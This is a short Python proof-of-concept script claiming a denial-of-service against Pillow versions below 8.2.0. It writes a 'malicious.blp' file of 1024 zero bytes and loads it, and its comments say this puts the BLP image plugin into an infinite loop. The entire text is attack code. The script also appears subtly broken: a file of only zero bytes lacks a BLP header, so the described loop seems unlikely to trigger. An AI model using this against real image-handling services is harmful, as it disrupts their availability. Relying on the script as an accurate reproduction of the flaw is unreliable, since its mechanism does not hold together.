from PIL import Image # Pillow < 8.2.0 

# Create a malicious BLP image file
with open('malicious.blp', 'wb') as f:
    f.write(b'\x00' * 1024)  # Write 1024 bytes of zeros

# Open the malicious image file using Pillow
img = Image.open('malicious.blp')

# This will cause the BlpImagePlugin to enter an infinite loop,
# leading to a denial of service condition
img.load()